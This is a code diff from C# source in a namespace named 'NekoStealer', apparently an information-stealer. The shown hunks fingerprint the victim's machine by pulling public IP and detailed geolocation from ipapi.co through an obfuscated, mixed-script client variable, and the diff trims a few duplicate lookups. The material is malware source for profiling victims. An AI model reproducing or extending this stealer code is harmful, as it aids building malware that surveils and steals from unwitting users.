@@ -53,10 +53,8 @@ namespace NekoStealer
             string IP = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/ip/");
             // Getting more info of IP Adress
             string city_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/city/");
-            string country_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country/");
             string timezone_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/timezone/");
             string languages_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/languages/");
-            string currency_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/currency/");
             string region_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/region/");
             string region_code_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/region_code/");
             string country_code_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_code/");
@@ -68,7 +66,6 @@ namespace NekoStealer
             string country_population_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_population/");
             string in_eu_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/in_eu/");
             string postal_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/postal/");
-            string timezoneip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/timezone/");
             string utc_offset_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/utc_offset/");
             string country_calling_code_ip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/country_calling_code/");
             string currencyip = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/currency/");
